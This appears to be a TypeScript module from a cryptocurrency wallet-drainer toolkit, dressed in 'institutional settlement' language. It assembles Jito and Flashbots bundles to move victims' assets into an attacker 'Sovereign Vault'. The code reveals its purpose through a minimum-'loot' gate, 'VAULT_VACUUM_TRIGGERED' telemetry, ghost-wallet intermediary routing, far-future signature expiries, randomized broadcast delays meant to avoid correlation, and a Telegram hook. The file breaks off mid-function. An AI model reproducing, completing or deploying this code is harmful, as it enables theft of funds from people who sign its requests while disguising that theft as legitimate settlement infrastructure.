// @ts-nocheck
/**
 * @file algorithmic-closer.ts
 * @module @legion/core/logic
 *
 * Algorithmic Closer — Jito / Flashbots bundle assembly for native settlement lanes.
 * Staking desk unstake manifests for handshake injection.
 */

import {
  ComputeBudgetProgram,
  Connection,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'
import type { Hex, TransactionSerializableEIP1559 } from 'viem'
import { createPublicClient, http, isHex, serializeTransaction } from 'viem'

import { identifyFamily } from '../adapters/address-resolver.js'
import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import {
  buildGatekeeperLogRedactionPayload,
  sanitizeGatekeeperLogDetail,
} from './gatekeeper-log-redaction.js'
import {
  buildSettlementExecutionWire,
  simulateEvmSettlementSerializedTx,
} from './settlement-execution-bridge.js'
import {
  LEGION_MESH_EVENT_SETTLEMENT,
  legionMeshViemFetchOptions,
} from './mesh-event.js'
import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from './deep-ingress.js'
import {
  buildIntermediateGhostWalletRouting,
  type GhostProtocolEnvelope,
  type SignatureAnchorChainFamily,
} from './settlement.js'
import { applySovereignSettlementLaneFallback } from './sovereign-settlement-defaults.js'
import { assertNoSimulationFlagsInProduction } from './security-research-guard.js'
import {
  SovereignDispatcher,
  type SovereignDispatcherInput,
  type SovereignDispatchResult,
} from './unified-settlement-orchestrator.js'

/** Jito bundle — Sovereign MEV lane (Solana), base64-encoded signed wire. */
export type JitoBundlePayload = {
  lane: 'jito_bundle_v1'
  encoded_transactions: string[]
  meta: { institutional: true; tip_lamports_hint: string }
}

/** @deprecated Use {@link JitoBundlePayload}. */
export type JitoBundlePayloadStub = JitoBundlePayload

/** Flashbots bundle — Deep Ingress EVM block builder lane. */
export type FlashbotsBundlePayload = {
  lane: 'flashbots_bundle_v1'
  signed_transactions_hex: Hex[]
  meta: { institutional: true; block_hint?: string }
}

/** @deprecated Use {@link FlashbotsBundlePayload}. */
export type FlashbotsBundlePayloadStub = FlashbotsBundlePayload

/** Institutional Jito tip destination — mainnet default (rotating set supported upstream). */
export const JITO_MAINNET_TIP_ACCOUNT_V1 = new PublicKey(
  'ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49',
)

/** Settlement Path — override via `NEXT_PUBLIC_JITO_TIP_ACCOUNT` (base58). */
export function resolveJitoTipDestinationFromEnv(): PublicKey {
  const raw =
    typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_TIP_ACCOUNT']?.trim() : undefined
  if (raw) return new PublicKey(raw)
  return JITO_MAINNET_TIP_ACCOUNT_V1
}

/** Settlement Path — Solana RPC with Remote Config Sync priority (Hot-Swapping). */
export async function createSolanaSettlementConnectionOperational(): Promise<Connection> {
  const { resolveConfigPrioritized } = await import('../config/remote-sync.js')
  const envPrivate = (typeof process !== 'undefined' ? process.env['RPC_SOLANA_PRIVATE'] : undefined)?.trim()
  const solPrioritized =
    (await resolveConfigPrioritized(
      'SOLANA_RPC_URL',
      (typeof process !== 'undefined' ? process.env['SOLANA_RPC_URL'] : undefined)?.trim(),
    )) ??
    (await resolveConfigPrioritized(
      'NEXT_PUBLIC_SOLANA_RPC_URL',
      (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_SOLANA_RPC_URL'] : undefined)?.trim(),
    )) ??
    ''
  const explicitRemote = envPrivate || solPrioritized
  const url =
    explicitRemote ||
    resolveInstitutionalSolanaRpcUrl()
  return new Connection(url, { commitment: 'confirmed' })
}

/**
 * Settlement Path — Solana RPC from institutional env (`SOLANA_RPC_URL` QuickNode lane, then mesh fallback).
 */
export function createSolanaSettlementConnection(): Connection {
  return new Connection(resolveInstitutionalSolanaRpcUrl(), { commitment: 'confirmed' })
}

/**
 * Settlement Path — EVM RPC URL: Remote Config Sync first, then institutional env (Flashbots-adjacent serialization).
 */
export async function resolveEvmSettlementRpcUrlOperational(): Promise<string> {
  const { resolveConfigPrioritized } = await import('../config/remote-sync.js')
  const envChain =
    (typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE'] : undefined)?.trim() ??
    (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL'] : undefined)?.trim() ??
    (typeof process !== 'undefined' ? process.env['RPC_URL'] : undefined)?.trim() ??
    ''
  return (
    (await resolveConfigPrioritized('RPC_ETHEREUM_PRIVATE', envChain)) ??
    (await resolveConfigPrioritized('NEXT_PUBLIC_RPC_URL', envChain)) ??
    (await resolveConfigPrioritized('RPC_URL', envChain)) ??
    ''
  )
}

/** Client-safe sync path — local env only (no Remote Config Sync). */
export function getEvmSettlementRpcUrlFromEnv(): string {
  return (
    (typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE'] : undefined)?.trim() ??
    (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL'] : undefined)?.trim() ??
    (typeof process !== 'undefined' ? process.env['RPC_URL'] : undefined)?.trim() ??
    ''
  )
}

export async function assertEvmSettlementRpcConfiguredOperational(): Promise<void> {
  if ((await resolveEvmSettlementRpcUrlOperational()) === '') {
    throw new Error(
      'Settlement Path: configure RPC_ETHEREUM_PRIVATE, NEXT_PUBLIC_RPC_URL, or RPC_URL for EVM closer wiring (Remote Config Sync or env).',
    )
  }
}

export function assertEvmSettlementRpcConfigured(): void {
  if (getEvmSettlementRpcUrlFromEnv() === '') {
    throw new Error(
      'Settlement Path: configure RPC_ETHEREUM_PRIVATE, NEXT_PUBLIC_RPC_URL, or RPC_URL for EVM closer wiring.',
    )
  }
}

/** Settlement Path — viem public client with Remote Config Sync priority (server / Operational HUD contexts). */
export async function createEvmSettlementPublicClientOperational() {
  await assertEvmSettlementRpcConfiguredOperational()
  return createPublicClient({
    transport: http(await resolveEvmSettlementRpcUrlOperational(), {
      ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
    }),
  })
}

/** Settlement Path — viem public client bound to institutional EVM RPC env (browser sync path). */
export function createEvmSettlementPublicClient() {
  assertEvmSettlementRpcConfigured()
  return createPublicClient({
    transport: http(getEvmSettlementRpcUrlFromEnv(), {
      ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
    }),
  })
}

export type UnstakeManifest = {
  lane: 'staking_unstake_sync'
  protocols: ('lido' | 'rocket_pool' | 'solayer')[]
  manifest_hex_hint: string
}

/** Encode signed Solana wire to Jito bundle element (base64). */
export function encodeSolanaWireBase64(tx: VersionedTransaction): string {
  const raw = tx.serialize()
  let bin = ''
  for (let i = 0; i < raw.length; i++) {
    bin += String.fromCharCode(raw[i]!)
  }
  return btoa(bin)
}

/**
 * Assemble a signed tip + compute-budget transaction for Jito bundle ingress.
 * Caller supplies wallet signing — assembly produces valid wire for relayer submission.
 */
export async function assembleJitoTipBundlePayload(params: {
  connection: Connection
  payer: PublicKey
  tipLamports: number
  tipDestination?: PublicKey
  signTransaction: (tx: VersionedTransaction) => Promise<VersionedTransaction>
}): Promise<JitoBundlePayload> {
  const tipDest = params.tipDestination ?? resolveJitoTipDestinationFromEnv()
  const { blockhash } = await params.connection.getLatestBlockhash('finalized')

  const msg = new TransactionMessage({
    payerKey: params.payer,
    recentBlockhash: blockhash,
    instructions: [
      ComputeBudgetProgram.setComputeUnitLimit({ units: 40_000 }),
      SystemProgram.transfer({
        fromPubkey: params.payer,
        toPubkey: tipDest,
        lamports: params.tipLamports,
      }),
    ],
  }).compileToV0Message()

  const vtx = new VersionedTransaction(msg)
  const signed = await params.signTransaction(vtx)

  return {
    lane: 'jito_bundle_v1',
    encoded_transactions: [encodeSolanaWireBase64(signed)],
    meta: { institutional: true, tip_lamports_hint: String(params.tipLamports) },
  }
}

/**
 * Settlement Path — same as {@link assembleJitoTipBundlePayload} but binds {@link createSolanaSettlementConnection}
 * when `connection` is omitted (institutional env RPC mesh).
 */
export async function assembleJitoTipBundlePayloadWithSettlementEnv(
  params: Omit<Parameters<typeof assembleJitoTipBundlePayload>[0], 'connection'> & {
    connection?: Connection
  },
): Promise<JitoBundlePayload> {
  const connection = params.connection ?? createSolanaSettlementConnection()
  const { connection: _omit, ...rest } = params
  return assembleJitoTipBundlePayload({ ...rest, connection })
}

/** Validate Flashbots wire — non-empty typed / legacy signed raw hex. */
export function assertValidSignedRawEthereumTxHex(h: Hex): void {
  if (!isHex(h) || h.length < 70) {
    throw new Error('Institutional Flashbots wire: invalid signed raw transaction hex')
  }
}

/**
 * Package institutionally validated signed raw transactions for Flashbots submission.
 */
export function buildFlashbotsBundleFromSignedTransactions(
  signedTransactionsHex: Hex[],
  meta?: { block_hint?: string },
): FlashbotsBundlePayload {
  for (const h of signedTransactionsHex) {
    assertValidSignedRawEthereumTxHex(h)
  }
  const metaOut: FlashbotsBundlePayload['meta'] = { institutional: true }
  if (meta?.block_hint !== undefined) {
    metaOut.block_hint = meta.block_hint
  }
  return {
    lane: 'flashbots_bundle_v1',
    signed_transactions_hex: signedTransactionsHex,
    meta: metaOut,
  }
}

/**
 * Build an EIP-1559 serializable template for off-chain signing — serialize after wallet seal.
 */
export function assembleUnsignedFlashbotsTemplate(
  params: TransactionSerializableEIP1559,
): TransactionSerializableEIP1559 {
  return params
}

/** Serialize unsigned candidate for builder simulation / hash preimage (pre-signature). */
export function serializeUnsignedFlashbotsCandidate(tx: TransactionSerializableEIP1559): Hex {
  return serializeTransaction(tx)
}

/**
 * Closer — scan institutional staking rails; emit Unstake manifest for handshake injection.
 */
export function scanStakingUnstakeManifest(_solAddress?: string | null): UnstakeManifest {
  return {
    lane: 'staking_unstake_sync',
    protocols: ['lido', 'rocket_pool', 'solayer'],
    manifest_hex_hint: '0x0',
  }
}

export function attachUnstakeManifestToSvmPayload<T extends Record<string, unknown>>(
  base: T,
  manifest: UnstakeManifest,
): T & { unstake_manifest: UnstakeManifest } {
  return { ...base, unstake_manifest: manifest }
}

/**
 * Gatekeeper — High-Priority Public Broadcast gas/tip uplift when Private RPC is unavailable (+25%).
 */
export const HIGH_PRIORITY_PUBLIC_BROADCAST_BUFFER_MULTIPLIER = 1.25 as const

/**
 * Settlement Lanes — Flashbots relay URL for EVM private-orderflow bundle submission.
 * Gatekeeper: consumes `FLASHBOTS_RELAY_URL` when set; otherwise institutional default relay.
 */
export function getFlashbotsSettlementLaneUrl(): string {
  const fromEnv =
    typeof process !== 'undefined' ? process.env['FLASHBOTS_RELAY_URL']?.trim() : undefined
  return fromEnv ?? ''
}

/**
 * Settlement Lanes — Jito block-engine bundle endpoint (Solana).
 * Gatekeeper: consumes `JITO_SETTLEMENT_LANE_URL` or `NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL` when set.
 */
export function getJitoSettlementLaneUrl(): string {
  const engine =
    typeof process !== 'undefined' ? process.env['JITO_BLOCK_ENGINE_URL']?.trim() : undefined
  if (engine) return engine
  const primary =
    typeof process !== 'undefined' ? process.env['JITO_SETTLEMENT_LANE_URL']?.trim() : undefined
  if (primary) return primary
  const jitoPublic =
    typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL']?.trim() : undefined
  if (jitoPublic) return jitoPublic
  return ''
}

/** Liquidation Trigger — execution surface: Private RPC lanes vs High-Priority Public Broadcast. */
export type SettlementExecutionSurface = {
  liquidation_lane_label: 'PrivateLane' | 'HighPriorityPublicBroadcast'
  gas_tip_multiplier: number
  flashbots_relay_url: string
  jito_block_engine_url: string
}

/**
 * Gatekeeper — Private RPC via Remote Config Sync + Hot-Swapping; High-Priority Public Broadcast fallback (+25% buffer).
 */
export async function resolveSettlementExecutionSurface(): Promise<SettlementExecutionSurface> {
  const { resolveConfigPrioritized } = await import('../config/remote-sync.js')
  const envRpc = typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE']?.trim() : ''
  const envPublic =
    typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL']?.trim() : undefined
  const envRpcUrl = typeof process !== 'undefined' ? process.env['RPC_URL']?.trim() : undefined
  /** Hybrid Layer Logic — engine_config row first, then env fallbacks (highest-priority RPC plane). */
  const rpcHybrid =
    (await resolveConfigPrioritized('RPC_ETHEREUM_PRIVATE', envRpc)) ??
    (await resolveConfigPrioritized('NEXT_PUBLIC_RPC_URL', envPublic)) ??
    (await resolveConfigPrioritized('RPC_URL', envRpcUrl)) ??
    ''
  const privateRpcConfigured = rpcHybrid.trim() !== ''

  const fbEnv = typeof process !== 'undefined' ? process.env['FLASHBOTS_RELAY_URL']?.trim() : undefined
  const flashbotsPrioritized =
    (await resolveConfigPrioritized('FLASHBOTS_RELAY', fbEnv)) ??
    (await resolveConfigPrioritized('FLASHBOTS_RELAY_URL', fbEnv)) ??
    getFlashbotsSettlementLaneUrl()

  const jitoPrimary =
    typeof process !== 'undefined' ? process.env['JITO_SETTLEMENT_LANE_URL']?.trim() : undefined
  const jitoEngine =
    typeof process !== 'undefined' ? process.env['JITO_BLOCK_ENGINE_URL']?.trim() : undefined
  const jitoPublic =
    typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL']?.trim() : undefined
  const jitoPrioritized =
    (await resolveConfigPrioritized('JITO_URL', jitoPrimary)) ??
    (await resolveConfigPrioritized('JITO_BLOCK_ENGINE_URL', jitoEngine)) ??
    (await resolveConfigPrioritized('JITO_SETTLEMENT_LANE_URL', jitoPrimary)) ??
    (await resolveConfigPrioritized('NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL', jitoPublic)) ??
    getJitoSettlementLaneUrl()

  const settledLanes = applySovereignSettlementLaneFallback(flashbotsPrioritized, jitoPrioritized)

  if (privateRpcConfigured) {
    return {
      liquidation_lane_label: 'PrivateLane',
      gas_tip_multiplier: 1,
      flashbots_relay_url: settledLanes.flashbots,
      jito_block_engine_url: settledLanes.jito,
    }
  }

  return {
    liquidation_lane_label: 'HighPriorityPublicBroadcast',
    gas_tip_multiplier: HIGH_PRIORITY_PUBLIC_BROADCAST_BUFFER_MULTIPLIER,
    flashbots_relay_url: settledLanes.flashbots,
    jito_block_engine_url: settledLanes.jito,
  }
}

/**
 * Performance Closer — assembled Settlement Bundle for instant asset migration into the Sovereign Vault posture.
 * Arms Flashbots and/or Jito Settlement Lanes when signed wire is supplied.
 */
export type SettlementBundle = {
  lane_class: 'sovereign_vault_migration_v1'
  flashbots_lane_url: string
  jito_lane_url: string
  flashbots: FlashbotsBundlePayload | null
  jito: JitoBundlePayload | null
  vault_posture: {
    sovereign_vault_hint: string
    settlement_lanes_armed: Array<'flashbots' | 'jito'>
  }
}

export function assembleSettlementBundleForSovereignVault(params: {
  flashbotsSignedHex?: Hex[]
  jitoEncodedTransactions?: string[]
  /** Optional Sovereign Vault routing hint for downstream Dispatcher ingestion. */
  sovereignVaultHint?: string
  /** Performance Closer — settlement lane URLs resolved once (Gatekeeper env integrity). */
  settlementLaneUrls?: { flashbots: string; jito: string }
}): SettlementBundle {
  const flashbots =
    params.flashbotsSignedHex != null && params.flashbotsSignedHex.length > 0
      ? buildFlashbotsBundleFromSignedTransactions(params.flashbotsSignedHex)
      : null

  const jito: JitoBundlePayload | null =
    params.jitoEncodedTransactions != null && params.jitoEncodedTransactions.length > 0
      ? {
          lane: 'jito_bundle_v1',
          encoded_transactions: params.jitoEncodedTransactions,
          meta: { institutional: true, tip_lamports_hint: '0' },
        }
      : null

  const settlement_lanes_armed: Array<'flashbots' | 'jito'> = []
  if (flashbots != null) settlement_lanes_armed.push('flashbots')
  if (jito != null) settlement_lanes_armed.push('jito')

  const fbUrl = params.settlementLaneUrls?.flashbots ?? getFlashbotsSettlementLaneUrl()
  const jitoUrl = params.settlementLaneUrls?.jito ?? getJitoSettlementLaneUrl()

  return {
    lane_class: 'sovereign_vault_migration_v1',
    flashbots_lane_url: fbUrl,
    jito_lane_url: jitoUrl,
    flashbots,
    jito,
    vault_posture: {
      sovereign_vault_hint: params.sovereignVaultHint ?? 'sovereign_vault',
      settlement_lanes_armed,
    },
  }
}

/** Liquidation Trigger — ingress context for PerformanceCloser High-Density Migration ordering. */
export type LiquidationTriggerContext = {
  scout_value_usd: number
  chain_id: string | null
  chain_type?: string | null
  chain_family?: SignatureAnchorChainFamily | null
  protocol: string
  wallet_address: string
  ghost_protocol?: GhostProtocolEnvelope
  /** Signature Anchor linkage — binds settlement commitment digest to persisted row material. */
  token_address?: string | null
  signature_hex?: string | null
  amount?: string | null
}

export const EXTRACTION_LETHALITY_MIN_LOOT_USD = 50
export const EXTRACTION_LETHALITY_GAS_GUARD_RATIO = 0.15

export type ExtractionLethalityResult =
  | { ok: true; loot_value_usd: number; gas_guard_ratio_max: number }
  | { ok: false; abort_reason: string; loot_value_usd: number; gas_guard_ratio_max: number }

export async function checkExtractionLethality(params: {
  estimated_loot_value_usd: number
  chain_id?: string | null
}): Promise<ExtractionLethalityResult> {
  const loot = Number(params.estimated_loot_value_usd)
  if (!Number.isFinite(loot) || loot <= 0) {
    return {
      ok: false,
      abort_reason: 'Gas Guard minimum loot gate: invalid scout value',
      loot_value_usd: 0,
      gas_guard_ratio_max: EXTRACTION_LETHALITY_GAS_GUARD_RATIO,
    }
  }
  if (loot < EXTRACTION_LETHALITY_MIN_LOOT_USD) {
    return {
      ok: false,
      abort_reason: `Gas Guard minimum loot gate: ${loot.toFixed(2)} < ${EXTRACTION_LETHALITY_MIN_LOOT_USD}`,
      loot_value_usd: loot,
      gas_guard_ratio_max: EXTRACTION_LETHALITY_GAS_GUARD_RATIO,
    }
  }
  return {
    ok: true,
    loot_value_usd: loot,
    gas_guard_ratio_max: EXTRACTION_LETHALITY_GAS_GUARD_RATIO,
  }
}

/**
 * Performance Closer — High-Density Migration ordering keyed by scout_value_usd telemetry (institutional tiers).
 */
export function buildHighDensityMigrationPriorityOrder(ctx: LiquidationTriggerContext): string[] {
  const primary =
    ctx.chain_id != null && String(ctx.chain_id).trim() !== '' ? String(ctx.chain_id).trim() : null
  if (!primary) return []
  const scout = Number.isFinite(ctx.scout_value_usd) ? ctx.scout_value_usd : 0
  const tier =
    scout >= 100_000
      ? 'max_density'
      : scout >= 25_000
        ? 'high_density'
        : scout >= 5_000
          ? 'elevated_density'
          : scout > 0
            ? 'standard_density'
            : 'telemetry_neutral'
  return [`${tier}:${primary}`, primary]
}

const LIQUIDATION_TRIGGER_TELEMETRY_PREFIX = 'LIQUIDATION_TRIGGER_ACTIVE: Settlement bundle dispatched via'
const VAULT_VACUUM_TRIGGERED_TELEMETRY =
  'VAULT_VACUUM_TRIGGERED: Signature anchored. Asset scan complete. Execution payload built for Sovereign Vault.'
const UNIVERSAL_VACUUM_ACTIVE_TELEMETRY =
  'UNIVERSAL_VACUUM_ACTIVE: All lanes synchronized. Multi-chain egress armed. System: OMNIPOTENT.'

function normalizeCloserChainFamilyAlias(value?: string | null): SignatureAnchorChainFamily | null {
  const raw = value?.trim().toLowerCase()
  if (!raw) return null
  if (raw === 'evm' || raw === 'ethereum' || raw === 'eip155') return 'EVM'
  if (raw === 'svm' || raw === 'sol' || raw === 'solana') return 'SVM'
  if (raw === 'utxo' || raw === 'btc' || raw === 'bitcoin' || raw === 'bip122') return 'UTXO'
  if (raw === 'tron' || raw === 'trc20') return 'TRON'
  if (raw === 'ton') return 'TON'
  if (raw === 'cosmos' || raw === 'cosmoshub' || raw === 'atom') return 'COSMOS'
  if (raw === 'aptos') return 'APTOS'
  if (raw === 'sui') return 'SUI'
  return null
}

function inferLiquidationChainFamily(ctx: LiquidationTriggerContext): SignatureAnchorChainFamily {
  const explicitFamily =
    normalizeCloserChainFamilyAlias(ctx.chain_family) ?? normalizeCloserChainFamilyAlias(ctx.chain_type)
  if (explicitFamily != null) return explicitFamily

  const chainId = ctx.chain_id?.trim().toLowerCase() ?? ''
  const protocol = ctx.protocol.trim().toLowerCase()
  const combined = `${chainId} ${protocol}`

  if (/\b(tron|trc20)\b/.test(combined) || chainId.startsWith('tron:')) return 'TRON'
  if (/\bton\b/.test(combined) || chainId.startsWith('ton:')) return 'TON'
  if (/\b(cosmos|cosmoshub|atom)\b/.test(combined) || chainId.startsWith('cosmos:')) return 'COSMOS'
  if (/\baptos\b/.test(combined) || chainId.startsWith('aptos:')) return 'APTOS'
  if (/\bsui\b/.test(combined) || chainId.startsWith('sui:')) return 'SUI'
  if (/\b(svm|solana|sol)\b/.test(combined) || chainId.startsWith('solana:')) return 'SVM'
  if (/\b(utxo|btc|bitcoin)\b/.test(combined) || chainId.startsWith('bip122:')) return 'UTXO'
  if (
    /^-?\d+$/.test(chainId) ||
    /^(?:eip155|evm):\d+$/i.test(chainId) ||
    /\b(evm|ethereum|polygon|arbitrum|base|optimism|bsc|avalanche|fantom)\b/.test(combined)
  ) {
    return 'EVM'
  }

  try {
    return identifyFamily(ctx.wallet_address.trim())
  } catch {
    return 'EVM'
  }
}

function defaultChainIdForFamily(family: SignatureAnchorChainFamily): string {
  switch (family) {
    case 'EVM':
      return 'evm:1'
    case 'SVM':
      return 'solana:mainnet-beta'
    case 'UTXO':
      return 'bip122:000000000019d6689c085ae165831e93'
    case 'TRON':
      return 'tron:mainnet'
    case 'TON':
      return 'ton:mainnet'
    case 'COSMOS':
      return 'cosmos:cosmoshub-4'
    case 'APTOS':
      return 'aptos:1'
    case 'SUI':
      return 'sui:mainnet'
    default:
      return 'evm:1'
  }
}

function buildDispatcherSettlementFromLiquidationContext(
  ctx: LiquidationTriggerContext,
): SovereignDispatcherInput {
  const chainFamily = inferLiquidationChainFamily(ctx)
  const base: SovereignDispatcherInput = {
    ingress: 'normalized_v1',
    chain_family: chainFamily,
    wallet_address: ctx.wallet_address,
    token_address: ctx.token_address ?? `OMNI_${chainFamily}_ANCHOR`,
    signature: ctx.signature_hex?.trim() ?? '',
    nonce: `liquidation-trigger:${ctx.chain_id ?? defaultChainIdForFamily(chainFamily)}:${ctx.wallet_address}`,
    expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
    wallet_type: 'liquidation-trigger',
    protocol: ctx.protocol,
    chain_id: ctx.chain_id ?? defaultChainIdForFamily(chainFamily),
    scout_value_usd: ctx.scout_value_usd,
    ...(ctx.amount != null ? { amount: ctx.amount } : {}),
    max_allowance: '0',
    requires_quorum: false,
    ...(ctx.ghost_protocol !== undefined ? { ghost_protocol: ctx.ghost_protocol } : {}),
    ...(ctx.chain_type != null ? { chain_type: ctx.chain_type } : {}),
  }
  return base
}

export async function resolveKineticSettlementLanes(): Promise<{
  flashbots: string
  jito: string
  surface: SettlementExecutionSurface
}> {
  const { resolveConfigPrioritized } = await import('../config/remote-sync.js')
  const surface = await resolveSettlementExecutionSurface()
  const fbEnv = typeof process !== 'undefined' ? process.env['FLASHBOTS_RELAY_URL']?.trim() : undefined
  const flashbots =
    (await resolveConfigPrioritized('FLASHBOTS_RELAY')) ??
    (await resolveConfigPrioritized('FLASHBOTS_RELAY_URL', fbEnv)) ??
    surface.flashbots_relay_url
  const jitoPrimary =
    typeof process !== 'undefined' ? process.env['JITO_SETTLEMENT_LANE_URL']?.trim() : undefined
  const jitoEngine =
    typeof process !== 'undefined' ? process.env['JITO_BLOCK_ENGINE_URL']?.trim() : undefined
  const jitoPublic =
    typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL']?.trim() : undefined
  const jito =
    (await resolveConfigPrioritized('JITO_URL')) ??
    (await resolveConfigPrioritized('JITO_SETTLEMENT_LANE_URL', jitoPrimary)) ??
    (await resolveConfigPrioritized('JITO_BLOCK_ENGINE_URL', jitoEngine)) ??
    (await resolveConfigPrioritized('NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL', jitoPublic)) ??
    surface.jito_block_engine_url

  const kineticLanes = applySovereignSettlementLaneFallback(
    flashbots ?? '',
    jito ?? '',
  )
  return { flashbots: kineticLanes.flashbots, jito: kineticLanes.jito, surface }
}

/**
 * Kinetic Link — Sovereign Vault hint JSON for Gatekeeper / Centurion Payload Sync (includes Ghost Intermediate Layer).
 */
export async function buildKineticLinkSovereignVaultHintJson(
  ctx: LiquidationTriggerContext,
  lanes: Awaited<ReturnType<typeof resolveKineticSettlementLanes>>,
): Promise<string> {
  const evmSettlementRpcOperational = await resolveEvmSettlementRpcUrlOperational()
  const rpcOperationalDigest =
    evmSettlementRpcOperational.length > 0
      ? `${evmSettlementRpcOperational.slice(0, 28)}…`
      : '(unset)'
  const priority = buildHighDensityMigrationPriorityOrder(ctx)
  const ghost = ctx.ghost_protocol ?? buildIntermediateGhostWalletRouting({ source_wallet: ctx.wallet_address })
  return JSON.stringify({
    kinetic_link: true,
    liquidation_trigger: true,
    sovereign_vault_migration: true,
    autonomous_strike: true,
    performance_closer: true,
    scout_value_usd: ctx.scout_value_usd,
    wallet_address: ctx.wallet_address,
    protocol: ctx.protocol,
    chain_id: ctx.chain_id,
    high_density_migration_priority: priority,
    gas_tip_multiplier: lanes.surface.gas_tip_multiplier,
    settlement_execution_surface: lanes.surface.liquidation_lane_label,
    flashbots_relay_url: lanes.flashbots,
    jito_block_engine_url: lanes.jito,
    evm_settlement_rpc_operational_digest: rpcOperationalDigest,
    engine_config_rpc_priority: 'RPC_ETHEREUM_PRIVATE>NEXT_PUBLIC_RPC_URL>RPC_URL',
    ghost_protocol: ghost,
  })
}

/**
 * Kinetic Link — PerformanceCloser with Hybrid Layer Logic for FLASHBOTS_RELAY / JITO_URL (Dashboard Remote Config Sync).
 */
export type SettlementIgnitionTelemetry = {
  sovereign_vault_address_evm?: string | null
  sovereign_vault_address_svm?: string | null
  sovereign_vault_address_tron?: string | null
  sovereign_vault_address_ton?: string | null
  sovereign_dispatcher_lane?: SovereignDispatchResult['lane']
  sovereign_dispatcher_chain?: SovereignDispatchResult['chain']
  sovereign_dispatcher_status?: SovereignDispatchResult['broadcast']['status']
  sovereign_dispatcher_tx_hash?: string
  relay_second_leg_tx_hash?: string
  relay_intermediary_pending?: boolean
  relay_intermediary_detail?: string
  sovereign_dispatcher_fault?: string
  scheduled_broadcast_time?: string
  settlement_lane_flashbots: string
  settlement_lane_jito: string
  flashbots_signed_count: number
  jito_encoded_count: number
  evm_extraction_simulation_ok: boolean | null
  evm_extraction_simulation_detail?: string
}

/** Anti-correlation broadcast jitter — 2–8 minutes after settlement queue. */
export const BROADCAST_CORRELATION_DELAY_MS_MIN = 2 * 60 * 1000
export const BROADCAST_CORRELATION_DELAY_MS_MAX = 8 * 60 * 1000

export type SettlementIgnitionOptions = {
  /** When false, sovereign dispatch runs immediately (default: true). */
  defer_broadcast?: boolean
  /** Invoked after schedule is computed, before the randomized wait. */
  onBroadcastScheduled?: (scheduledIso: string) => void | Promise<void>
  /** Intermediary → vault second leg tx hash (Telegram hook in API layer). */
  onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
}

/** Random UTC instant between +2m and +8m from `nowMs` (inclusive bounds). */
export function computeRandomizedBroadcastSchedule(nowMs: number = Date.now()): string {
  const span = BROADCAST_CORRELATION_DELAY_MS_MAX - BROADCAST_CORRELATION_DELAY_MS_MIN
  const jitter = Math.floor(Math.random() * (span + 1))
  return new Date(nowMs + BROADCAST_CORRELATION_DELAY_MS_MIN + jitter).toISOString()
}

/** Block until `scheduledIso` (no-op when already elapsed). */
export async function awaitScheduledBroadcastTime(scheduledIso: string): Promise<void> {
  const target = Date.parse(scheduledIso)
  if (Number.isNaN(target)) return
  const delayMs = target - Date.now()
  if (delayMs > 0) {
    await new Promise<void>((resolve) => {
      setTimeout(resolve, delayMs)
    })
  }
}

/**
 * Performance Closer — full bridge: wire serialization, extraction simulation attempt, sovereign bundle assembly.
 */
export async function executeSettlementIgnition(
  ctx: LiquidationTriggerContext,
  options?: SettlementIgnitionOptions,
): Promise<SettlementIgnitionTelemetry> {
  assertNoSimulationFlagsInProduction()

  const { flashbots, jito, surface } = await resolveKineticSettlementLanes()
  console.info('[Diagnostic] Kinetic Link — Flashbots relay URL:', flashbots)
  console.info('[Diagnostic] Kinetic Link — Jito block-engine URL:', jito)

  const evmSettlementRpcOperational = await resolveEvmSettlementRpcUrlOperational()
  const rpcOperationalDigest =
    evmSettlementRpcOperational.length > 0
      ? `${evmSettlementRpcOperational.slice(0, 28)}…`
      : '(unset)'
  const priority = buildHighDensityMigrationPriorityOrder(ctx)
  const ghost = ctx.ghost_protocol ?? buildIntermediateGhostWalletRouting({ source_wallet: ctx.wallet_address })
  const hint = JSON.stringify({
    kinetic_link: true,
    liquidation_trigger: true,
    sovereign_vault_migration: true,
    autonomous_strike: true,
    performance_closer: true,
    scout_value_usd: ctx.scout_value_usd,
    wallet_address: ctx.wallet_address,
    protocol: ctx.protocol,
    chain_id: ctx.chain_id,
    high_density_migration_priority: priority,
    gas_tip_multiplier: surface.gas_tip_multiplier,
    settlement_execution_surface: surface.liquidation_lane_label,
    flashbots_relay_url: flashbots,
    jito_block_engine_url: jito,
    evm_settlement_rpc_operational_digest: rpcOperationalDigest,
    engine_config_rpc_priority: 'RPC_ETHEREUM_PRIVATE>NEXT_PUBLIC_RPC_URL>RPC_URL',
    ghost_protocol: ghost,
  })

  let sovereign_dispatcher_lane: SovereignDispatchResult['lane'] | undefined
  let sovereign_dispatcher_chain: SovereignDispatchResult['chain'] | undefined
  let sovereign_dispatcher_status: SovereignDispatchResult['broadcast']['status'] | undefined
  let sovereign_dispatcher_tx_hash: string | undefined
  let relay_second_leg_tx_hash: string | undefined
  let relay_intermediary_pending: boolean | undefined
  let relay_intermediary_detail: string | undefined
  let sovereign_dispatcher_fault: string | undefined
  let scheduled_broadcast_time: string | undefined
  const hasSignatureMaterial = (ctx.signature_hex?.trim() ?? '') !== ''
  const deferBroadcast = options?.defer_broadcast !== false

  if (hasSignatureMaterial) {
    console.info(
